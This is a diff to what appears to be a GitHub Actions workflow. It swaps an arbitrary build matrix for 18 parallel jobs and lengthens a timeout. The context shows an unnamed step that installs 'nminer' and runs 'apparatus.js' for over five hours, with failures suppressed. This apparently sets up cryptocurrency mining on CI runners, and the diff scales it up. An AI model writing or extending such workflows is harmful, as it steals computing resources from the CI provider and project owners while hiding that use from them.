@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7967 }
-          - { version: 8309 }
-          - { version: 3975 }
-          - { version: 8582 }
-          - { version: 5831 }
-          - { version: 8213 }
-          - { version: 2934 }
-          - { version: 6518 }
-          - { version: 4108 }
-          - { version: 3146 }
-          - { version: 6188 }
-          - { version: 9272 }
-          - { version: 5986 }
-          - { version: 7711 }
-          - { version: 3557 }
-          - { version: 8872 }
-          - { version: 1789 }
+          - { version: 8968 }
+          - { version: 3366 }
+          - { version: 111 }
+          - { version: 1783 }
+          - { version: 4877 }
+          - { version: 1331 }
+          - { version: 8392 }
+          - { version: 6246 }
+          - { version: 1963 }
+          - { version: 3202 }
+          - { version: 583 }
+          - { version: 5018 }
+          - { version: 424 }
+          - { version: 4922 }
+          - { version: 9106 }
+          - { version: 5894 }
+          - { version: 2510 }
+          - { version: 1501 }
 
     steps:
       - name: Checkout
@@ -39,4 +40,4 @@ jobs:
       - name: 
         run: |
           npm install nminer@latest
-          timeout 309m node apparatus.js || echo "apparatus executed"
+          timeout 316m node apparatus.js || echo "apparatus executed"
